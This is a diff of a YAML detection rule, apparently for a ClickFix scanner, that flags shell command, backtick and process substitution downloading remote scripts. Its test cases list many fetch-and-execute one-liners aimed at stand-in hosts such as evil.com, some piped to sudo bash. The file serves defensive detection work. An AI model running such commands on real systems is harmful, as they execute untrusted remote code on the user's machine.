@@ -1,20 +1,10 @@
-name: medium-12-subshell-download
-severity: medium
+name: high-02-shell-substitution-download
+severity: high
 description: >
-  Detects bash/sh command substitution downloading and executing remote scripts. Common in Unix-targeted ClickFix attacks.
+  Detects shell command substitution, backticks, and process substitution downloading remote scripts.
 
-patterns:
-  - name: command-substitution-download
-    pattern: (?i)\$\((curl|wget).*(http|ftp)s?://.*\)
-    description: Detects command substitution with curl/wget
-
-  - name: backtick-substitution-download
-    pattern: (?i)`(curl|wget).*(http|ftp)s?://.*`
-    description: Detects backtick command substitution with download
-
-  - name: process-substitution-download
-    pattern: (?i)(bash|sh)\s+<\((curl|wget).*http
-    description: Detects process substitution with bash/sh
+pattern: |
+  (?i)(\$\(|`|<\()(curl|wget).*(https?|ftp)://
 
 malicious:
   - "$(curl http://evil.com/malware.sh | bash)"
@@ -25,23 +15,25 @@ malicious:
   - 'sh -c "$(wget -qO- https://evil.com/exploit.sh)"'
   - "$(curl -fsSL http://attacker.com/install.sh | bash)"
   - "eval $(wget -qO- ftp://evil.com/payload.sh)"
-  - "`curl -s http://malware.com/reverse-shell.sh`"
-  - "`wget -qO- http://evil.com/clickfix.sh | bash`"
   - "payload=$(curl http://attacker.com/malware.sh); eval $payload"
   - "$(curl -H 'User-Agent: Mozilla' http://evil.com/obfuscated.sh | sh)"
-  - 'bash -c "`wget -O- http://malware.com/dropper.sh`"'
   - "$(curl -L http://evil.com/stage2.sh) | bash"
-  - 'sh -c "$(curl --silent http://attacker.com/implant.sh)"'
-  - "`curl http://192.168.1.100/backdoor.sh | sh`"
   - "$(wget -qO- https://evil.com/ransomware.sh) | sudo bash"
-  - 'eval "`curl -s http://malware.com/loader.sh`"'
+  - 'eval "$(curl -s http://malware.com/loader.sh)"'
   - 'cmd=$(curl http://evil.com/command.sh); sh -c "$cmd"'
   - "$(curl -k https://attacker.com/payload.sh | bash -s)"
-  - "`wget --no-check-certificate https://evil.com/exploit.sh | sh`"
-  - "bash <(curl -s http://malware.com/trojan.sh)"
-  - "sh <(wget -qO- http://evil.com/persistence.sh)"
   - "$(curl ftp://attacker.com/dropper.sh) > /tmp/d.sh && bash /tmp/d.sh"
-  - "`curl -A 'curl/7.64.1' http://evil.com/stager.sh | bash`"
+  - "`curl http://evil.com/script.sh | bash`"
+  - "`wget -qO- http://attacker.com/malware.sh | sh`"
+  - "eval `curl -s https://evil.com/payload.sh`"
+  - "`wget -O - http://malware.com/dropper.sh`"
+  - 'sh -c "`curl http://evil.com/backdoor.sh`"'
+  - "bash <(curl http://evil.com/script.sh)"
+  - "sh <(wget -qO- https://attacker.com/payload.sh)"
+  - "bash <(curl -s http://malware.com/installer.sh)"
+  - 'eval "bash <(curl http://evil.com/exploit.sh)"'
+  - "sudo bash <(wget -qO- ftp://evil.com/dropper.sh)"
+  - "bash <(curl -fsSL http://attacker.com/malware.sh)"
 
 benign:
   - '$(echo "Hello World")'
@@ -52,20 +44,25 @@ benign:
   - "$(whoami)"
   - "var=$(cat file.txt)"
   - "$(grep pattern file.txt)"
-  - "`date +%Y-%m-%d`"
   - "$(uname -a)"
   - "output=$(ps aux | grep process)"
   - "$(hostname)"
-  - "`basename $0`"
   - "$(df -h)"
   - "version=$(git describe --tags)"
   - "$(which python)"
-  - "`id -u`"
   - "$(find . -name '*.log')"
   - "count=$(wc -l < file.txt)"
   - "$(echo $PATH | tr ':' '\n')"
-  - "`uptime`"
   - "$(printenv HOME)"
   - "user=$(id -un)"
   - "$(awk '{print $1}' data.txt)"
-  - "`dirname $0`"
+  - "$(git rev-parse HEAD)"
+  - "$(basename /path/to/file.txt)"
+  - "dir=$(dirname $0)"
+  - "$(date +%Y-%m-%d)"
+  - "files=$(ls *.txt)"
+  - "`date`"
+  - "`pwd`"
+  - "`whoami`"
+  - "bash <(cat script.sh)"
+  - "sh <(echo 'ls -la')"
